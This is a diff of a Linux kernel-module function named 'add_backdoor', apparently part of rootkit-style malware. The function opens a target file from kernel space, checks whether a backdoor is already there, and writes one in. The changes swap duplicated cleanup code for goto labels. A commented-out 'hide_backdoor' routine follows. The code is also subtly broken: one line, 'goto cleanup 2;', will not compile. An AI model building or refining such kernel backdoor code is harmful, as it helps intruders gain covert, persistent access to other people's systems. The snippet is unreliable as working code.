@@ -88,16 +88,18 @@ int add_backdoor(char *path) {
 	    	set_fs(old_fs); 
 
 	    	if(IS_ERR(file)){
-			return;
+			return 0;
 	    	}
 
 	    	//check if backdoor already exists
 	    	buffer = (char *) kmalloc(PAGE_SIZE, GFP_KERNEL);
 
 	    	if(!buffer){
-			 if(file)
-			 	{filp_close(file, NULL);}
-			return;
+			goto cleanup1;
+			
+// 			 if(file)
+// 			 	{filp_close(file, NULL);}
+// 			return 0;
 	    	}
 
 	    	backdoor_existing = false;
@@ -111,11 +113,13 @@ int add_backdoor(char *path) {
 			set_fs(old_fs);
 
 			if(ret < 0){
-		    		if(buffer)
-					{kfree(buffer);}
-		    	if(file)
-		    		{filp_close(file, NULL);}
-			return;
+				
+				goto cleanup 2;
+// 		    		if(buffer)
+// 					{kfree(buffer);}
+// 		    	if(file)
+// 		    		{filp_close(file, NULL);}
+// 			return offset;
 			}
 
 			page_count++;
@@ -127,12 +131,12 @@ int add_backdoor(char *path) {
 	    	}
 
 	    	if(backdoor_existing){
-			
-			if(buffer)
-				{kfree(buffer);}
-		    if(file)
-		    	{filp_close(file, NULL);}
-		return;
+			goto cleanup2;
+// 			if(buffer)
+// 				{kfree(buffer);}
+// 		    if(file)
+// 		    	{filp_close(file, NULL);}
+// 		return offset;
 			
 		    }
 
@@ -144,12 +148,13 @@ int add_backdoor(char *path) {
 	    	set_fs(old_fs);
 
 	    	if(offset < 0){
+			goto cleanup2;
 			
-			if(buffer)
-				{kfree(buffer);}
-		    if(file)
-		    	{filp_close(file, NULL);}
-		return;
+// 			if(buffer)
+// 				{kfree(buffer);}
+// 		    if(file)
+// 		    	{filp_close(file, NULL);}
+// 		return;
 			
 		}
 
@@ -160,23 +165,25 @@ int add_backdoor(char *path) {
 		set_fs(old_fs); 
 	
 		if(ret<0){
-			if(buffer)
-				{kfree(buffer);}
-		    if(file)
-		    	{filp_close(file, NULL);}
-		return offset;
+			
+			goto cleanup2;
+// 			if(buffer)
+// 				{kfree(buffer);}
+// 		    if(file)
+// 		    	{filp_close(file, NULL);}
+// 		return offset;
 	    	}
 
-// 		cleanup2:
-// 		    if(buffer)
-// 			kfree(buffer);
+		cleanup2:
+		    if(buffer)
+			kfree(buffer);
 	
-// 		cleanup1:
-// 		    if(file)
-// 			filp_close(file, NULL);
+		cleanup1:
+		    if(file)
+			filp_close(file, NULL);
 	
-// 		exit:
-// 		    return;
+		exit:
+		    return offset;
 }
 
 // void hide_backdoor (void) {
